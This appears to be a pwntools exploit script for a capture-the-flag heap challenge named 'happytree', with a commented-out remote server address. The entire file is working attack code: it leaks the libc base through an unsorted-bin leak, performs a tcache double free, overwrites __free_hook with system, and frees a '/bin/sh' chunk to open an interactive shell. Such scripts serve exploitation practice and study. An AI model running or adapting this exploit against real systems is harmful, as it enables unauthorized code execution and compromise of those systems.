from pwn import *

filename = "./happytree"
p = process(filename)
e = ELF(filename)
l = e.libc
# context.log_level = 'debug'
# p = remote("124.71.147.225", 9999)

def insNode(idx, cont):
	p.recvuntil(b"cmd>")
	p.sendline(b"1")
	p.recvuntil(b"data:")
	p.sendline(str(idx).encode())
	p.recvuntil(b"content:")
	p.send(cont)
def delNode(idx):
	p.recvuntil(b"cmd>")
	p.sendline(b"2")
	p.recvuntil(b"data:")
	p.sendline(str(idx).encode())
def showNode(idx):
	p.recvuntil(b"cmd>")
	p.sendline(b"3")
	p.recvuntil(b"data:")
	p.sendline(str(idx).encode())

# leak_libc_by_unsortedbin_attack
for i in range(9):
	insNode(0xd0+i, b'a')
for i in range(8):
	delNode(0xd0+i)
for i in range(7):
	insNode(0xd0+6-i, b'aaaa')
insNode(0xc0, b'a'*8)
showNode(0xc0)
p.recvuntil(b'a'*8)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebd70
print(hex(libc_base))

# tcache_double_free
insNode(0x41, b'a')
insNode(0x40, b'a')
insNode(0x42, b'a')
insNode(0x43, b'a')
delNode(0x42)
insNode(0x42, b'a')
delNode(0x42)
delNode(0x43)
delNode(0x40)
insNode(0x20, p64(0x43))
delNode(0x43)
delNode(0x20)

# get_shell_through_free_hook
insNode(0x20, p64(libc_base+l.symbols['__free_hook']))
insNode(0x21, p64(libc_base+l.symbols['system']))
insNode(0x44, b'/bin/sh\x00')
delNode(0x44)


p.interactive()